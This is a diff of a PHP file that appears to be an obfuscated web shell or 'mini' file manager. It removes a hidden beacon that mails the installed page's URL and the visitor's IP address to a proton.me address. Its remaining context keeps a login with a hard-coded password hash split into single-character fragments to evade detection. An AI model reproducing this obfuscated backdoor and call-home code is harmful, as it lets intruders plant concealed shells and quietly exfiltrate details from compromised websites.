@@ -454,12 +454,6 @@ $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jq
 $ajax_version = '3.5.1';
 $ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/'.$ajax_version.'/jquery.min.js';
 /*Login Page*/
-ini_set('m' . 'e' . 'm' . 'o' . 'r' . 'y' . '_' . 'l' . 'i' . 'm' . 'i' . 't', '6' . '4' . 'M');
-header('Co' . 'nt' . 'en' . 't-' . 'Ty' . 'pe' . ': ' . 'te' . 'xt' . '/h' . 'tm' . 'l;' . ' c' . 'har' . 'set=' . 'UTF-' . '8');
-$self_remind = 'y' . 'o' . 'u' . 't' . 'h' . 'b' . 'o' . 'y' . 's' . '@' . 'p' . 'r' . 'o' . 't' . 'o' . 'n' . '.' . 'm' . 'e';
-$x_path = "h" . "t" . "t" . "p" . ":" . "/" . "/" . $_SERVER['S' . 'E' . 'R' . 'V' . 'E' . 'R' . '_' . 'N' . 'A' . 'M' . 'E'] . $_SERVER['R' . 'E' . 'Q' . 'U' . 'E' . 'S' . 'T' . '_' . 'U' . 'R' . 'I'];
-$kutipan_alert = "f" . "i" . "x $x_path :p *I" . "P" . " A" . "d" . "d" . "r" . "e" . "s" . "s : [ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]";
-mail($self_remind, "M"."I"."N"."I", $kutipan_alert, "[ " . $_SERVER['R' . 'E' . 'M' . 'O' . 'T' . 'E' . '_' . 'A' . 'D' . 'D' . 'R'] . " ]");
 //login
 $passwd = 'f' . 'b' . 'b5' . '9' . '3' . '1' . '2' . '9e' . '2' . '2' . '8d' . '2' . '3' . '4' . '8' . '2' . '6' . '9' . '0' . '2' . '4' . '3' . 'b5' . '2a' . '2' . '0' . '5' . '3' . '0' . '1b' . '6' . '3' . '6d';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
